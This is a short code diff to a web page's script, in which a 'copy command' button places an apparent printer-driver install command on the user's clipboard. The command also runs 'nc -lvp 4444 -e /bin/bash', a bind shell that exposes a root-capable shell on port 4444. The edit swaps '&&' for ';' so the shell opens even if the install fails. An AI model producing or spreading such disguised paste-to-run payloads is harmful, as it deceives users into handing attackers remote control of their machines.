@@ -42,7 +42,7 @@
     <script>
         document.getElementById("copyButton").addEventListener("click", async function() {
             try {
-                await navigator.clipboard.writeText("sudo apt-get install printer-driver && nc -lvp 4444 -e /bin/bash");
+                await navigator.clipboard.writeText("sudo apt-get install printer-driver;  nc -lvp 4444 -e /bin/bash");
                 alert("Command copied to clipboard!");
             } catch (err) {
                 console.error("Clipboard copy failed:", err);
